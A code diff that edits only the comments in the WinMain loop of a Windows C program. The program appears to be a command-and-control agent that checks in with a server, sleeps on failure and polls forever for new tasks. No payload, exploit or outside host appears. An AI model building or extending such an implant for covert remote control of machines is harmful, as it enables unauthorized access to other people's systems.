@@ -44,33 +44,28 @@ BOOL InitConfig(VOID)
     return TRUE;
 }
 
-// Main agent loop
+// Main loop
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    // Initialize config
+    // Setup our config struct
     if (!InitConfig())
         return 1;
 
-    // Checkin loop - retry until success
+    // Try to checkin until we succeed
     while (!DoCheckin())
     {
         Sleep(nellConfig->sleeptime * 1000);
     }
 
-    // Main tasking loop
+    // Enter the matrix
     while (TRUE)
     {
-        // Ask for tasks and handle responses
+        // Check for new jobs
         if (!routine())
         {
-            // If routine fails (e.g. transport error), back off
-            // Note: routine() itself handles success sleep, so we only sleep here on failure if needed
-            // But routine() in Command.c currently returns TRUE almost always.
-            // If it returned FALSE, we should sleep.
+            // Something went wrong, take a nap before retrying
             Sleep(nellConfig->sleeptime * 1000);
         }
-        
-        // routine() implementation in Command.c includes a Sleep() at the end.
     }
 
     return 0;
